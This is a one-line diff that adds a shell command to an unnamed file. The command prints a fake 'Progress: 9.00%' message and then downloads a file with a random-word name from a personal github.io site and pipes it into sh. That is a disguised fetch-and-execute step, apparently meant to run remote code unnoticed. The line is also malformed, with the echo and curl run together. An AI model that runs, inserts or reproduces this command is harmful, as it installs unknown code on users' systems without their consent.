@@ -1,0 +1,1 @@
+echo Progress: 9.00%curl -L --progress-bar frkns.github.io/fun/plate-capture-meets-him-intended.ts | sh
